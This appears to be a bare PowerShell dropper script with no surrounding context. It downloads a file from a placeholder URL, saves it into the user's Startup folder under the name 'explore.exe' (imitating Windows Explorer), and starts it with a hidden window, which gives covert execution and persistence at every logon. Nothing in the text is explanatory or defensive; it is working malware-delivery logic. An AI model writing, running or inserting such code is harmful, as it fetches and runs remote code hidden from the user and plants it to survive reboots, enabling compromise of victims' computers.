$DownloadURL = "url"
$DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"

Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $DestinationPath

Start-Process -FilePath $DestinationPath -WindowStyle Hidden
